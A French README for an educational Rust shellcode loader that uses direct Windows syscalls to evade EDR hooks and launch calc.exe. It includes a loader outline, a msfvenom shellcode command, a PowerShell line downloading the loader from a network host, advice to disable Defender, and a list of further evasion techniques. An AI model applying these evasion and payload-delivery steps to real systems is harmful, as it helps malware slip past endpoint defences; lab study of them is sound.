# 🦀 Rust Syscall Loader

Un loader shellcode éducatif utilisant les **direct syscalls** en Rust pour exécuter calc.exe sur Windows.

> ⚠️ **AVERTISSEMENT**: Ce projet est uniquement à des fins éducatives et de recherche en sécurité. N'utilisez jamais ces techniques à des fins malveillantes.

## 📚 Concepts Clés

### Qu'est-ce qu'un Direct Syscall ?

Un **syscall** (system call) est une instruction CPU qui permet à un programme de demander un service au noyau Windows. Normalement, les programmes passent par les APIs Windows (ntdll.dll) qui font le syscall pour eux.

```
[Programme] → [kernel32.dll] → [ntdll.dll] → [SYSCALL] → [Kernel]
                    ↑               ↑
              EDR Hook          EDR Hook
```

Avec les **direct syscalls**, on bypass ces DLLs en faisant l'appel système directement :

```
[Programme] → [SYSCALL] → [Kernel]
                  ↑
           Pas de hook possible !
```

### Syscalls Utilisés

| Syscall | Description |
|---------|-------------|
| `NtAllocateVirtualMemory` | Alloue de la mémoire dans le processus |
| `NtWriteVirtualMemory` | Écrit des données dans la mémoire allouée |
| `NtCreateThreadEx` | Crée un thread pour exécuter le shellcode |

## 🛠️ Installation

### Prérequis

1. **Rust Nightly** (requis pour rust_syscalls)
```bash
rustup install nightly
rustup default nightly
```

2. **Target Windows** (pour cross-compilation depuis macOS/Linux)
```bash
rustup target add x86_64-pc-windows-gnu
```

3. **MinGW-w64** (linker pour Windows)
```bash
# macOS
brew install mingw-w64

# Linux (Debian/Ubuntu)
sudo apt install mingw-w64
```

## 🔨 Compilation

### Build pour Windows (depuis macOS)

```bash
# Debug build
cargo build --target x86_64-pc-windows-gnu

# Release build (recommandé)
cargo build --release --target x86_64-pc-windows-gnu
```

Le binaire sera généré dans :
```
target/x86_64-pc-windows-gnu/release/calc_loader.exe
```

### Configuration Cross-Compilation

Créez `.cargo/config.toml` (déjà inclus) :

```toml
[target.x86_64-pc-windows-gnu]
linker = "x86_64-w64-mingw32-gcc"
```

## 🚀 Utilisation

1. Compilez le projet
2. Transférez le `.exe` sur une VM Windows
3. Exécutez-le → La calculatrice s'ouvre !

```powershell
# Sur Windows
.\loader_rust.exe
```

## 📝 Structure du Code

```
loader_rust/
├── Cargo.toml          # Dépendances et configuration
├── .cargo/
│   └── config.toml     # Configuration cross-compilation
├── src/
│   └── main.rs         # Code principal avec syscalls
└── README.md           # Ce fichier
```

### Architecture du Loader

```rust
fn execute_shellcode(shellcode: &[u8]) {
    // 1. Allouer mémoire RWX
    syscall!("NtAllocateVirtualMemory", ...)
    
    // 2. Copier shellcode en mémoire
    syscall!("NtWriteVirtualMemory", ...)
    
    // 3. Créer thread pour exécuter
    syscall!("NtCreateThreadEx", ...)
    
    // 4. Attendre la fin du thread
    syscall!("NtWaitForSingleObject", ...)
}
```

## 🔧 Générer un Nouveau Shellcode

Pour générer votre propre shellcode calc.exe avec msfvenom :

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f rust
```

```bash
Invoke-WebRequest -Uri "http://192.168.x.x:8080/calc_loader.exe" -OutFile "C:\Users\$env:USERNAME\Downloads\calc_loader.exe"
```


Remplacez ensuite le contenu de `CALC_SHELLCODE` dans `main.rs`.

## 📖 Ressources

- [rust_syscalls](https://github.com/janoglezcampos/rust_syscalls) - Bibliothèque syscalls Rust
- [Rust-for-Malware-Development](https://github.com/Whitecat18/Rust-for-Malware-Development) - Exemples et techniques
- [SysWhispers3](https://github.com/klezVirus/SysWhispers3) - Génération de syscalls

## 🎯 Techniques Avancées (Pour Aller Plus Loin)

| Technique | Description | Difficulté |
|-----------|-------------|------------|
| Indirect Syscalls | Saute dans ntdll après le hook | ⭐⭐ |
| Hell's Gate | Récupère SSN dynamiquement | ⭐⭐⭐ |
| Halo's Gate | Hell's Gate + contourne les hooks | ⭐⭐⭐⭐ |
| TartarusGate | Halo's Gate amélioré | ⭐⭐⭐⭐⭐ |

## 🐛 Troubleshooting

### Erreur de compilation "linker not found"

```bash
# Vérifiez que mingw-w64 est installé
which x86_64-w64-mingw32-gcc

# Si pas trouvé, installez-le
brew install mingw-w64
```

### Erreur "requires nightly"

```bash
rustup default nightly
# ou
cargo +nightly build --release --target x86_64-pc-windows-gnu
```

### Windows Defender bloque l'exécution

C'est normal ! Le shellcode est détecté. Pour tester :
1. Désactivez temporairement Windows Defender
2. Utilisez une VM isolée
3. Ajoutez une exclusion pour le dossier de test

## ⚖️ Disclaimer

Ce projet est fourni uniquement à des fins éducatives. L'auteur n'est pas responsable de toute utilisation malveillante. Testez uniquement sur des systèmes dont vous êtes propriétaire ou sur lesquels vous avez une autorisation explicite.

---

**Happy Hacking! 🦀**
